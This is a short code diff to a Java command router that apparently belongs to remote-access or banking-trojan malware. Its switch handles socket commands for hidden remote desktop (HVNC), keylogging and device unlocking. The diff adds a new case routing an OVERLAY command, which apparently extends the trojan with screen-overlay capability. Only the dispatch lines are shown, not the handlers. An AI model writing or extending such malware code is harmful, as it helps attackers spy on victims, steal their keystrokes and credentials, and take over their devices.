@@ -94,6 +94,7 @@ public final class SocketCommandRouter {
                 case Protocol.HVNC:        handleHvnc(data, socket, cmdId); break;
                 case Protocol.INSPECTOR:   handleInspector(data, socket, cmdId); break;
                 case Protocol.KEYLOGGER:   handleKeylogger(data, socket, cmdId); break;
+                case Protocol.OVERLAY:     handleOverlay(data, cmdId); break;
                 case Protocol.DEVICE_UNLOCK: handleDeviceUnlock(data, socket, cmdId); break;
                 default:
                     try {
